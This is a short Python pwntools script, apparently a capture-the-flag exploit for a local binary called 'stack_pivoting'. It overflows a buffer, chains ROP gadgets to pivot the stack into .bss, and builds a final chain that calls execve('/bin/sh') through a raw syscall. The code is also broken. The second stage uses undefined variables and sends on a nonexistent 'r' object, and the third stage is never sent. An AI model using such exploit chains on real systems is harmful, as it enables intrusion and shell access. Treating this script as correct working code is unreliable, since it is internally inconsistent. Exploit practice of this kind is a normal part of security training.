from pwn import *

context.log_level = "debug"
p = process("./stack_pivoting")

pop_rsi_ret = 0x0000000000409f8e
read = 0x000000000040184B
bss = 0x4c8000
p.recvuntil(b"Do you know Stack_Pivoting?\n")
payload = cyclic(0x40) + p64(pop_rsi_ret) + p64(bss) + p64(read)
p.sendline(payload)

rop2 = flat(
    bss_buf, pop_rsi_ret, bss_buf + 0x20
    , pop_rdx_ret, 88, read_addr
)
raw_input('2')
r.sendline(rop2)

'''
Stage 3
'''
rop3 = flat(
    '/bin/sh\x00', pop_rdi_ret, bss_buf + 0x20,
    pop_rsi_ret, 0, pop_rdx_ret, 0,
    pop_rax_ret, 0x3b, syscall
)

p.interactive()
